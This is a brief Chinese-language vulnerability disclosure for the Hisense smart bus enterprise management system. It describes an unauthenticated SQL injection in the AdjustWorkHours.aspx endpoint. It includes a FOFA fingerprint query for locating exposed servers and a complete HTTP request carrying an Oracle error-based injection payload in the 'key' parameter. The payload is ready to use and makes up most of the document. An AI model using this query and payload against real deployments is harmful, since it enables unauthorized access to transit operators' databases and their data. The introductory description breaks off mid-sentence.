# 海信智能公交企业管理系统AdjustWorkHours.aspx存在SQL注入漏洞

海信智能公交企业管理系统是一套以智慧车、智慧站、智慧场为基础，以大数据和人工智能技术的公交云脑为核心，旨在全面提升公交企业的安全保障能力、运营生产效率、企业管理水平、决策分析能力和乘客出行体验的综合管理系统。海信智能公交企业管理系统 AdjustWorkHours.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

## fofa

```javascript
body="var _FactoryData"
```

## poc

```javascript
GET /YZSoft/Forms/XForm/BM/MaintainComManagement/AdjustWorkHours.aspx?key=1%27+AND+4208%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%284208%3D4208%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+dSSu HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

![image-20241128093316189](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280933260.png)